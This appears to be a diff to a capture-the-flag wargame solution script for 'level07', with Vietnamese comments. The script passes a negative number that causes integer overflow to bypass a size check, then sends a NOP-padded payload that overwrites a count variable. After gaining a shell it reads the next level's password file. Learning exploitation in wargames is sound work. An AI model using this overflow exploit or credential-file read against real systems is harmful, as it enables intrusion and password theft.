@@ -1,1 +1,7 @@
-./level07 -1073741808 $(python -c 'print "\x90"*60 + "\x46\x4c\x4f\x57"')
+# 1. Chạy payload khai thác
+# - Tham số argv[1] = -1073741808 gây tràn số nguyên khi nhân 4, đánh lừa câu lệnh if và ép memcpy copy 64 bytes.
+# - Tham số argv[2] chứa 60 byte NOP lấp đầy mảng buf, 4 byte cuối "\x46\x4c\x4f\x57" ghi đè lên biến count (Little-Endian của 0x574f4c46).
+/levels/level07 -1073741808 $(python2 -c 'print "\x90"*60 + "\x46\x4c\x4f\x57"')
+
+# 2. Đọc mật khẩu sau khi có shell
+cat /home/level8/.pass
